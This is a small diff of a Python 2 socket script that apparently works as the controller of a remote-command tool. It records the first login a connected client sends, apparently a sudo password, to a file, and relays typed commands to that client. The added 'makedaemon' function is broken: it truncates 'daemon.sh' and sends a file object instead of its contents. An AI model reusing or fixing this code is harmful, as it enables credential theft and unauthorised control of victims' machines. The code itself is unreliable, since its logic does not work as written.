@@ -14,7 +14,6 @@ def sendcode(c,ac):
     data = c.recv(2048)
     if not data:
         pass
-
     else:
         print data
 c,addr = client_socket.accept()
@@ -24,11 +23,15 @@ def sudopass(x):
         x = x + ";"
         file.write(x)
         file.close()
+
     else:
         pass
+def makedaemon():
+    fileopen = open("daemon.sh","wb")
+    c.send(fileopen)
 firstlogin = c.recv(2048)
 sudopass(firstlogin)
-print firstlogin
+makedaemon()
 while True:
 
     ac = raw_input(">\n")
